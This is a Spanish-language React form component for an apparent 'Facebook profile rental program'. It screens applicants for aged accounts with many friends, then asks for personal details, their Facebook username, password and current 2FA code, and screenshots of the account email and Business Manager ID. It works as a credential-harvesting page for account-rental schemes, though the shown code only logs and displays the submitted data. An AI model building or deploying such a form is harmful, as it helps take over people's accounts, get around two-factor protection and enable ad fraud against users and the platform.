import React, { useState, useEffect } from "react";
import { useForm, Controller } from "react-hook-form";
import { CountryDropdown, RegionDropdown } from "react-country-region-selector";

import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";

import DatePicker from "react-datepicker";
import "react-datepicker/dist/react-datepicker.css";

// Styles
import {
  JoinUs,
  JoinUsSection,
  JoinUsSectionWrapper,
  JoinUsSectionTitle,
  JoinUsSectionInfo,
  FormsWrapper,
  FormLocation,
  Forms,
  FormOne,
  FormTwo,
  FormThree,
  FormFour,
  FormFive,
  JoinUsImage,
  Location,
  FormLocationTitle,
  InputWraper,
  Question,
  Options,
  Option,
  Buttons,
  Button,
} from "../../styles/JoinUsPageStyles";

const JoinUsPage = () => {
  const [country, setCountry] = useState("");
  const [region, setRegion] = useState("");
  const [phone, setPhone] = useState(null);
  const [date, setDate] = useState(null);

  const [formStep, setFormStep] = useState(1);
  const {
    register,
    handleSubmit,
    watch,
    getValues,
    control,
    trigger,
    clearErrors,

    formState: { errors, isValid },
  } = useForm({ mode: "onChange" });

  const values = getValues();

  const onSubmit = (data) => {
    console.log("datos", data);
    handleFormStep();
  };

  const onClickSubmit = (e) => {
    console.log(values);
  };

  useEffect(() => {
    console.log("clear");
    clearErrors();
  }, [formStep]);

  const handleFormStep = (value) => {
    setFormStep(formStep + value);
  };

  const renderButton = () => {
    const submitPage = 4;
    switch (true) {
      case formStep > submitPage:
        return null;
      case formStep === submitPage:
        return (
          <Buttons one>
            <Button disabled={!isValid} type="submit">
              Enviar
            </Button>
          </Buttons>
        );
      case formStep < submitPage && 1 < formStep:
        return (
          <Buttons>
            <Button type="submit" onClick={() => handleFormStep(-1)}>
              Anterior
            </Button>

            <Button
              //
              disabled={!isValid}
              //
              type="submit"
              onClick={() => handleFormStep(1)}
            >
              Siguiente
            </Button>
          </Buttons>
        );

      case formStep === 1:
        return (
          <Buttons one>
            <Button
              //
              disabled={!isValid}
              //
              type="submit"
              onClick={() => handleFormStep(1)}
            >
              Siguiente
            </Button>
          </Buttons>
        );
      default:
        return null;
    }
  };

  // console.log(errors);

  return (
    <JoinUs>
      <JoinUsSection>
        <JoinUsSectionWrapper>
          <JoinUsSectionTitle>
            Es válido tu perfil de Facebook para nuestro programa de alquiler?
          </JoinUsSectionTitle>
          <JoinUsSectionInfo>
            Para saber si es válido para nuestro programa de alquiler, completa
            este sencillo cuestionario.
          </JoinUsSectionInfo>
          <FormsWrapper onSubmit={handleSubmit(onSubmit)}>
            <FormLocation>
              <FormLocationTitle>Formulario de registro</FormLocationTitle>
              <Location className={`${formStep === 1 && "active"}`}>
                <p className="number">1</p>
                <p className="location">Cuestionario de calificación</p>
              </Location>
              <Location className={`${formStep === 2 && "active"}`}>
                <p className="number">2</p>
                <p className="location">Datos personales</p>
              </Location>
              <Location className={`${formStep === 3 && "active"}`}>
                <p className="number">3</p>
                <p className="location">Datos de cuenta de Facebook</p>
              </Location>
              <Location className={`${formStep === 4 && "active"}`}>
                <p className="number">4</p>
                <p className="location">Método de pago y Confirmación</p>
              </Location>
              {formStep === 5 && (
                <Location className={`${formStep === 5 && "active"}`}>
                  <p className="number">5</p>
                  <p className="location">Felicitaciones</p>
                </Location>
              )}
            </FormLocation>
            <Forms>
              {formStep === 1 && (
                <FormOne step={formStep}>
                  <OptionInput
                    width="short"
                    className="isAdult"
                    type="radio"
                    options={[
                      ["Sí", "si"],
                      ["No", "no"],
                    ]}
                    question="¿Eres mayor de edad?"
                    register={register("isAdult", {
                      required: {
                        value: true,
                        message: "Este campo es obligatorio",
                      },
                    })}
                  />
                  <OptionInput
                    width="short"
                    className="accountIsReal"
                    type="radio"
                    options={[
                      ["Sí", "si"],
                      ["No", "no"],
                    ]}
                    question="¿Estás creando la solicitud con tu perfil real de Facebook?"
                    register={register("accountIsReal", {
                      required: {
                        value: true,
                        message: "Este campo es obligatorio",
                      },
                    })}
                  />

                  <OptionInput
                    width="short"
                    className="isFirstTime"
                    type="radio"
                    options={[
                      ["Sí", "si"],
                      ["No", "no"],
                    ]}
                    question="¿Tú o alguien más ha utilizado tu cuenta antes para crear publicidad?"
                    register={register("isFirstTime", {
                      required: {
                        value: true,
                        message: "Este campo es obligatorio",
                      },
                    })}
                  />
                  <OptionInput
                    width="short"
                    className="isOneYear"
                    type="radio"
                    options={[
                      ["Sí", "si"],
                      ["No", "no"],
                    ]}
                    question="¿Tu cuenta tiene más de un año?"
                    register={register("isOneYear", {
                      required: {
                        value: true,
                        message: "Este campo es obligatorio",
                      },
                    })}
                  />
                  <OptionInput
                    width="short"
                    className="haveFriends"
                    type="radio"
                    options={[
                      ["Sí", "si"],
                      ["No", "no"],
                    ]}
                    question="¿Tienes más de 100 amigos en Facebook?"
                    register={register("haveFriends", {
                      required: {
                        value: true,
                        message: "Este campo es obligatorio",
                      },
                    })}
                  />
                </FormOne>
              )}
              {formStep === 2 && (
                <FormTwo step={formStep}>
                  <TextInput
                    className="name"
                    question="Tu nombre"
                    register={register("name", {
                      required: {
                        value: true,
                        message: "Por favor, registre su nombre",
                      },
                      pattern: {
                        value: /^[ a-zA-Z\-\’]+$/,
                        message: "El nombre contiene caracteres no permitidos",
                      },
                    })}
                    error={errors.name && errors.name.message}
                  />

                  <TextInput
                    className="lastname"
                    question="Tus apellidos"
                    register={register("lastname", {
                      required: {
                        value: true,
                        message: "Por favor, registre su apellido",
                      },
                      pattern: {
                        value: /^[ a-zA-Z\-\’]+$/,
                        message:
                          "El apellido contiene caracteres no permitidos",
                      },
                    })}
                    error={errors.lastname && errors.lastname.message}
                  />

                  <TextInput
                    className="countryDropdown"
                    question="Tu país de residencia"
                    error={errors.country && errors.country.message}
                    component={
                      <Controller
                        name="country"
                        defaultValue={null}
                        control={control}
                        rules={{
                          required: {
                            value: true,
                            message: "Este campo es obligatorio",
                          },
                        }}
                        render={({ name, field: { onChange, onBlur } }) => {
                          return (
                            <CountryDropdown
                              name={name}
                              value={country}
                              onChange={(countryName) => {
                                setCountry(countryName);
                                onChange(countryName);
                              }}
                              onBlur={() => trigger("country")}
                            />
                          );
                        }}
                      />
                    }
                  />

                  <TextInput
                    question="Tu ciudad de residencia"
                    className="regionDropdown"
                    error={errors.city && errors.city.message}
                    component={
                      <Controller
                        control={control}
                        name="city"
                        rules={{
                          required: {
                            value: true,
                            message: "Este campo es obligatorio",
                          },
                        }}
                        defaultValue=""
                        render={({ name, field: { onChange, onBlur } }) => {
                          return (
                            <RegionDropdown
                              name={name}
                              country={country}
                              value={region}
                              onChange={(regionName) => {
                                setRegion(regionName);
                                onChange(regionName);
                              }}
                              onBlur={() => trigger("city")}
                            />
                          );
                        }}
                      />
                    }
                  />

                  <TextInput
                    className="birthday"
                    question="Fecha de nacimiento"
                    error={errors.birthday && errors.birthday.message}
                    component={
                      <Controller
                        control={control}
                        name="birthday"
                        defaultValue=""
                        rules={{
                          required: {
                            value: true,
                            message:
                              "Por favor, ingrese la fecha de su nacimiento",
                          },
                          validate: {
                            isNotOldEnough: (v) => {
                              function getAge(dob) {
                                var diff_ms = Date.now() - dob.getTime();
                                var age_dt = new Date(diff_ms);

                                return Math.abs(age_dt.getUTCFullYear() - 1970);
                              }

                              const age = getAge(v);
                              console.log(age);
                              if (!(age >= 18)) {
                                return "Debes ser mayor de 18 años";
                              }
                              return true;
                            },
                          },
                        }}
                        render={({ name, field: { onChange, onBlur } }) => {
                          return (
                            <DatePicker
                              name={name}
                              selected={date}
                              onChange={(date) => {
                                setDate(date);
                                onChange(date);
                              }}
                              onBlur={() => trigger("birthday")}
                            />
                          );
                        }}
                      />
                    }
                  />

                  <TextInput
                    className="phone"
                    question="Tu celular"
                    error={errors.phone && errors.phone.message}
                    component={
                      <Controller
                        name="phone"
                        control={control}
                        defaultValue=""
                        rules={{
                          required: {
                            value: true,
                            message: "Este campo es obligatorio",
                          },
                          pattern: {
                            // value: /^\+?([0-9]{2})\)?[-. ]?([0-9]{4})[-. ]?([0-9]{4})$/,
                            value: /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/,
                            message: "Ingrese un numero de celular válido",
                          },
                        }}
                        render={({ name, field: { onChange, onBlur } }) => {
                          return (
                            <PhoneInput
                              name={name}
                              country={"pe"}
                              value={phone}
                              countryCodeEditable={false}
                              onChange={(phone) => {
                                setPhone(phone);
                                onChange(phone);
                              }}
                              onBlur={() => trigger("phone")}
                            />
                          );
                        }}
                      />
                    }
                  />

                  <TextInput
                    className="email"
                    question="Email"
                    error={errors.email && errors.email.message}
                    register={register("email", {
                      required: {
                        value: true,
                        message: "Por favor, ingrese su email",
                      },
                      pattern: {
                        value: /(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])/,
                        message: "Ingrese un email valido",
                      },
                    })}
                  />
                </FormTwo>
              )}
              {formStep === 3 && (
                <FormThree step={formStep}>
                  <OptionInput
                    width="wide"
                    className="frecuency"
                    type="radio"
                    options={[
                      ["Todos los días", "1"],
                      ["1 - 2 veces a la semana", "2"],
                      ["2 - 3 veces a la semana", "3"],
                      ["1 - 2 veces al mes", "4"],
                    ]}
                    question="¿Con qué frecuencia usas Facebook?"
                    register={register("frecuency", {
                      required: true,
                      message: "Este campo es obligatorio",
                    })}
                  />

                  <OptionInput
                    width="wide"
                    className="devices"
                    type="checkbox"
                    options={[
                      ["PC sobremesa", "1"],
                      ["Tablet", "2"],
                      ["Móvil", "3"],
                      ["Otros", "4"],
                    ]}
                    question="¿Con qué frecuencia usas Facebook? (Puedes seleccionar más de uno)"
                    register={register("devices", {
                      required: true,
                      message: "Este campo es obligatorio",
                    })}
                  />

                  <OptionInput
                    width="wide"
                    className="os"
                    type="checkbox"
                    options={[
                      ["Windows", "1"],
                      ["Android", "2"],
                      ["Apple", "3"],
                      ["Otros", "4"],
                    ]}
                    question="¿Qué sistema operativo utilizas con Facebook? (Puedes seleccionar más de uno)"
                    register={register("os", {
                      required: true,
                      message: "Este campo es obligatorio",
                    })}
                  />

                  <TextInput
                    className="username"
                    question="Usuario de Facebook"
                    register={register("username", {
                      required: true,
                      message: "Por favor, ingrese su usuario de Facebook",
                    })}
                  />
                  <TextInput
                    type="password"
                    className="password"
                    question="Contraseña de Facebook"
                    register={register("password", {
                      required: true,
                      message: "Por favor, ingrese su constraseña de Facebook",
                    })}
                  />
                  <FileInput
                    className="fbEmailIsConfirmed"
                    question="Confirmación del email asociado a tu perfil"
                    register={register("fbEmailIsConfirmed", {
                      required: true,
                      message:
                        "Por favor, ingrese una foto confirmando el email asociado",
                    })}
                  />
                  <FileInput
                    className="bmIdIsConfirmed"
                    question="Identificador del administrador comercial (BM id)"
                    register={register("bmIdIsConfirmed", {
                      required: true,
                      message:
                        "Por favor, ingrese una foto confirmando el número de tu Administrado Comercial",
                    })}
                  />
                  <TextInput
                    className="code2FA"
                    question="Código 2FA (Token)"
                    register={register("code2FA", {
                      required: true,
                      message: "Por favor, ingrese su código",
                    })}
                  />
                </FormThree>
              )}
              {formStep === 4 && (
                <FormFour step={formStep}>
                  <TextInput
                    className="referreal"
                    question="Si tienes un referente añade aquí su código"
                    register={register("referreal")}
                  />

                  <OptionInput
                    width="full"
                    className="termsAndConditions"
                    type="checkbox"
                    options={[["Acepto los Términos y Condiciones", "si"]]}
                    register={register("termsAndConditions", {
                      required: true,
                      message: "Por favor, acepte los Términos y Condiciones",
                    })}
                  />

                  <OptionInput
                    width="full"
                    className="gdprAgreement"
                    type="checkbox"
                    options={[
                      [
                        "Doy mi consentimiento para que este sitio web almacene mi información enviada para que puedan responder a mi consulta.",
                        "si",
                      ],
                    ]}
                    register={register("gdprAgreement", {
                      required: true,
                      message: "Por favor, acepte el Acuerdo GDPR",
                    })}
                  />
                </FormFour>
              )}
              {formStep === 5 && (
                <FormFive step={formStep}>
                  <p>El procese de registro esta finalizado.</p>
                  <p>Nos estaremos poniendo en contacto contigo pronto.</p>
                </FormFive>
              )}
              {renderButton()}

              <pre>{JSON.stringify(watch(), null, 2)}</pre>
            </Forms>
          </FormsWrapper>
          <JoinUsImage />
        </JoinUsSectionWrapper>
      </JoinUsSection>
    </JoinUs>
  );
};

export default JoinUsPage;

const OptionInput = ({
  className,
  type,
  options,
  question,
  register,
  error,
  width,
}) => {
  return (
    <InputWraper className={className}>
      {question && (
        <Question>
          {question} <span>*</span>
        </Question>
      )}

      <Options width={width}>
        {options.map((option) => {
          return (
            <>
              <Option>
                <input
                  style={{ opacity: 0 }}
                  type={type}
                  value={option[1]}
                  {...register}
                />

                {option[0]}
                <span className={`box ${type}`}></span>
              </Option>
              {/* <p>{error.form1 && error.form1.isAdult && "si"}</p> */}
            </>
          );
        })}
      </Options>
    </InputWraper>
  );
};

const TextInput = ({
  type,
  className,
  register,
  question,
  error,
  component,
}) => {
  return (
    <InputWraper className={className}>
      <Question>
        {question} <span>*</span>
      </Question>
      {!component ? (
        <input type={type ? type : "text"} {...register} />
      ) : (
        component
      )}
      <p className="error">{error}</p>
    </InputWraper>
  );
};

const FileInput = ({ className, register, question }) => {
  const onChange = (e) => {
    const files = e.target.files;
    console.log(files);
  };
  return (
    <InputWraper className={className}>
      <Question>
        {question} <span>*</span>
      </Question>
      <input type="file" {...register} onChange={(e) => onChange(e)} />
    </InputWraper>
  );
};
